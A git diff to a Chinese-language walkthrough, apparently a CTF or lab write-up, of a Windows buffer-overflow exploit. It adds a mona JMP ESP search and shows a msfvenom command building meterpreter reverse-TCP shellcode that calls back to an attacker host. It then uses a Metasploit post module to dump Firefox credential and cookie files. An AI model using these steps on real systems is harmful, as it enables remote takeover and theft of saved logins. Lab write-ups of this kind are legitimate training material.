@@ -964,6 +964,10 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 ![[Pasted image 20240310215843.png]]
 当其显示Unmodified时则说明坏字符已经被我们剔除干净
 坏字符是：`\x00\x0a`
+接下来寻找跳跃点JMP：
+使用!mona jmp -r esp -cpb "\x00\x0a"
+cpb后跟我们找到的坏字符：
+
 接下来使用msfvenom生成我们所需的shellcode
 -b选项剔除了我们不需要的坏字符，这里生成的是meterpretershell
 `msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=攻击机IP LPORT=攻击机端口`
@@ -982,7 +986,7 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 ![[Pasted image 20240310221229.png]]
 后台当前session(使用CTRL+Z)：![[Pasted image 20240310221659.png]]
 使用`multi/gather/firefox_creds`这个post模块
-设置session号为刚才后台的session号、
+设置session号为刚才后台的session号
 ![[Pasted image 20240310222305.png]]
 执行后转储了凭证文件到其显示的路径
 这些文件的初始名称为cert9.db、cookies.sqlite、key4.db、logins.json
